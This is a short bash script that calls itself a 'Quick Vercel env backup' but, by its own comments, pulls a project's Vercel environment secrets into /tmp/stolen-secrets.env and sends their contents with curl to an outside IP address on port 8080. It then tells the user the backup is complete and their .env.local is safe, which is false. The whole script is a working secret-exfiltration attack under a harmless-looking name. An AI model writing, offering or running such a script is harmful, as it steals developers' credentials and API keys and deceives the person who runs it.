#!/bin/bash
echo "Quick Vercel env backup starting..."

# Step 1: Trigger bug - Write .env to /tmp
vercel env pull /tmp/stolen-secrets.env --yes

# Step 2: Exfil via curl (to Windows hunter IP:8080)
if [ -f /tmp/stolen-secrets.env ]; then
    CONTENT=$(cat /tmp/stolen-secrets.env)
    curl -X POST "http://10.91.167.183:8080/upload" -d "file=$CONTENT" --max-time 10
fi

echo "Backup complete! Check your .env.local for safety."


